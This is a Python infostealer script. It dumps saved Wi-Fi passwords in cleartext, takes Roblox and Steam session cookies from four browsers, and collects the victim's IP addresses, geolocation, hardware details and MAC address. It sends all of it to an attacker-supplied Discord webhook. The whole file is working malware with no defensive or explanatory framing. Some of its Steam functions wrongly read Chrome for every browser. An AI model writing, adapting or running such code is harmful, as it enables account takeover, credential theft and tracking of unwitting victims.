#Import libraries
from discord_webhook import DiscordWebhook, DiscordEmbed
import browser_cookie3
from urllib.request import urlopen
import subprocess
import json
import socket
import platform
import re
import uuid
import psutil

webhook = DiscordWebhook(url='YourWebhookHere')#Set up webhook

def ip4():#Get ipv4
    try:
     with urlopen('https://4.ident.me') as response:
       return response.read().decode('ascii')
    except:
     with urlopen('https://4.tnedi.me') as response:
       return response.read().decode('ascii')
def ip6():#get ipv6
    try:
     with urlopen('https://6.ident.me') as response:
       return response.read().decode('ascii')
    except:
     with urlopen('https://6.tnedi.me') as response:
       return response.read().decode('ascii')
def wifipass():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    wifi_info = {}

    if not profiles:
        return []

    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            wifi_info[i] = results[0]
        except IndexError:
            wifi_info[i] = ""

    return wifi_info 
wifi=str(wifipass())
wifi=wifi.replace('{','')
wifi=wifi.replace('}','')
wifi=wifi.replace(',','\n')



url='http://ipinfo.io/json'
response = urlopen(url)
data = json.load(response)
org=data['org']
city = data['city']
country=data['country']
region=data['region']
loc=data['loc']
postal=data['postal']
latlong=str(loc).split(',')
lat,long=latlong[0],latlong[1]


def edge_logger():
    try:
        rcookies = browser_cookie3.edge(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in edge_logger: {str(e)}")
        return []

def chrome_logger():
    try:
        rcookies = browser_cookie3.chrome(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in chrome_logger: {str(e)}")
        return []
def firefox_logger():
    try:
        rcookies = browser_cookie3.firefox(domain_name='roblox.com')
        rcookies = str(rcookies)
        rcookie = rcookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        
        return rcookie
    except Exception as e:
        print(f"Error occurred in firefox_logger: {str(e)}")
        return []
def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return cookie
    except Exception as e:
        print(f"Error occurred in opera_logger: {str(e)}")
        return []  
roblochrome,robloedge,roblofire,robloopera=chrome_logger(),edge_logger(),firefox_logger(),opera_logger()

def edge_steam():
    try:
        scookies = browser_cookie3.chrome(domain_name='store.steampowered.com')
        scookies=str(scookies)
        scookie=scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0]
        return scookie
    except Exception as e:
        print(f"Error occurred in edge_logger: {str(e)}")
        return []
def chrome_steam():
    try:
        scookies = browser_cookie3.chrome(domain_name='store.steampowered.com')
        scookies=str(scookies)
        scookie=scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0]
        return scookie
    except Exception as e:
        print(f"Error occurred in chrome_logger: {str(e)}")
        return []
def firefox_steam():
    try:
        scookies = browser_cookie3.chrome(domain_name='store.steampowered.com')
        scookies=str(scookies)
        scookie=scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0]
        return scookie
    except Exception as e:
        print(f"Error occurred in firefox_logger: {str(e)}")
        return []
def opera_steam():
    try:
        scookies = browser_cookie3.chrome(domain_name='store.steampowered.com')
        scookies=str(scookies)
        scookie=scookies.split('steamLoginSecure=')[1].split('for store.steampowered.com/>]>')[0]
        return scookie
    except Exception as e:
        print(f"Error occurred in opera_logger: {str(e)}")
        return []
steamchrome,steamedge,steamfire,steamopera=chrome_steam(),edge_steam(),firefox_steam(),opera_steam()

def sysinfo():
    info={}
    info['Hostname']=socket.gethostname()
    info['Processor']=platform.processor()
    info['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
    info['Machine']=platform.machine()
    info['Architecture']=platform.architecture()
    info['OS']=platform.system()
    info['OS-release']=platform.release()
    info['OS-version']=platform.version()
    info['Mac-Address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
    return json.dumps(info)
info=json.loads(sysinfo())



wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
locationembed=DiscordEmbed(title='Location Data',description=f'```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```',color='fcba03')
robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
sysembed=DiscordEmbed(title='System Information',description=f'```Hostname: {info["Hostname"]}```\n```IPv4: {ip4()}```\n```IPv6: {ip6()}```\n```Proccessor: {info["Processor"]}```\n```Ram: {info["RAM"]}```\n```Machine: {info["Machine"]}```\n```Architecture: {info["Architecture"]}```\n```OS: {info["OS"]}```\n```OS-Release: {info["OS-release"]}```\n```OS-Version: {info["OS-version"]}```\n```Mac-Address: {info["Mac-Address"]}```',color='ab222b')
steamembed=DiscordEmbed(title='steamLoginSecure Cookies',description=f'Opera:```{steamopera}```\nChrome:```{steamchrome}```\nEdge:```{steamedge}```\nFirefox:```{steamfire}```',color='4e6cd9')
webhook.add_embed(sysembed) 
webhook.add_embed(wifiembed)
webhook.add_embed(locationembed)
webhook.add_embed(robloxembed)
webhook.add_embed(steamembed)

webhook.execute()#Sends webhook

